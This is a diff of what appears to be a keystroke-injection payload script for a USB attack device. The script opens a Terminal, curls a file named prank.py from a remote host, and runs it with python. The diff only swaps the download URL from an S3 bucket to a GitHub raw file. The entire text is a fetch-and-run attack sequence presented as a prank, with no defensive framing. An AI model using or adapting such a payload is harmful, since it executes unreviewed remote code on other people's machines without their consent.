@@ -8,7 +8,7 @@ STRING Terminal
 ENTER
 DELAY 2000
 DELAY 1000
-STRING curl https://s3-us-west-2.amazonaws.com/remoteduck/prank.py -o prank.py
+STRING curl https://github.com/stbernardy/RemoteDuck/raw/master/YoutubeTabPrank/prank.py -o prank.py
 ENTER
 DELAY 1000
 STRING python prank.py
